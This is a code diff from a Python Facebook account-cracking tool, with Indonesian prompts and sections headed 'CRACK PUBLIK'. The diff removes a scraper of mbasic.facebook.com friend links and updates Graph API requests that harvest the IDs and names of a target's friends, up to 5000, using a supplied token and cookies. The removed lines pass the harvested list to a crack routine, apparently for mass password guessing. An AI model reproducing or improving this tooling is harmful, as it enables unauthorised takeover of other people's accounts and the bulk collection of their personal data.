@@ -343,34 +343,9 @@ def ComingSoon():
 # CRACK PUBLIK 
 def PublikGRAPH(token,cookie):
 	try:
-		url = parser(requests.get(url_mb,cookies=coki).text,"html.parser")
-		for z in url.find_all("a",href=True):
-			if "fref" in z.get("href"):
-				if "/profile.php?id=" in z.get("href"):
-					idt = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",z.get("href")))
-					nama = z.text 
-				else:
-					idt = "".join(bs4.re.findall("/(.*?)\?",z.get("href")))
-					nama = z.text
-				if idt+"<=>"+nama in id: 
-					pass 
-				else:
-					id.append(idt+"<=>"+nama)
-				sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),
-				sys.stdout.flush();jeda(0.0050)
-		for x in url.find_all("a",href=True):
-			if "Lihat Teman Lain" in x.text: 
-				dump_id("https://mbasic.facebook.com/"+x.get("href"),coki)
-	except:pass 
-	print("")
-	if len(id)!=0:
-		return crack().__xnx__(id)
-	else:
-		exit(f"{M} gagal mengambil ID")
-	try:
 		print ("\n %sPastikan daftar teman bersifat %sPUBLIK "%(P,H))
 		user = input(' %sMasukan %sUsername%s/%sID%s : %s'%(P,H,P,K,P,M))
-		po = requests.get(f"https://graph.facebook.com/{user}?fields=friends&access_token={tokz}",cookies=cook).json()
+		po = requests.get(f"https://graph.facebook.com/v23.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
 		for i in po['friends']['data']:
 			id.append(f"{i['id']}<=>{i['name']}")
 		#print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
@@ -395,7 +370,7 @@ def MassalPublikGRAPH(token,cookie):
 			except AttributeError:
 				exit('%s╰─%s %s tidak di temukan'%(P,M,user))
 			else:
-				po = requests.get(f"https://graph.facebook.com/{user}/friends?limit=9999&access_token={token}",cookies=cookie).json()
+				po = requests.get(f"https://graph.facebook.com/v23.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
 				for i in po['friends']['data']:
 					id.append(f"{i['id']}<=>{i['name']}")
 		except KeyError:
